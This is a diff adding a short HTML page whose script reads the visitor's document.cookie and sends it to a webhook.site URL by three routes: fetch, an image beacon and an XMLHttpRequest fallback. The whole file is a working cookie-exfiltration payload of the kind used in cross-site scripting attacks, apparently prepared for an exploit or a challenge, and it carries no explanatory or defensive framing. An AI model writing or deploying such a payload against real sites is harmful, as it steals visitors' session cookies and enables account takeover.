@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  var webhook = "https://webhook.site/03807195-ac08-4806-8000-ad96844ec76d";
+  
+  // Method 1: fetch
+  fetch(webhook + "?c=" + encodeURIComponent(document.cookie));
+  
+  // Method 2: image beacon (fallback)
+  new Image().src = webhook + "?cookie=" + encodeURIComponent(document.cookie);
+  
+  // Method 3: XHR fallback
+  var x = new XMLHttpRequest();
+  x.open("GET", webhook + "?xhr=" + encodeURIComponent(document.cookie));
+  x.send();
+</script>
+</body>
+</html>
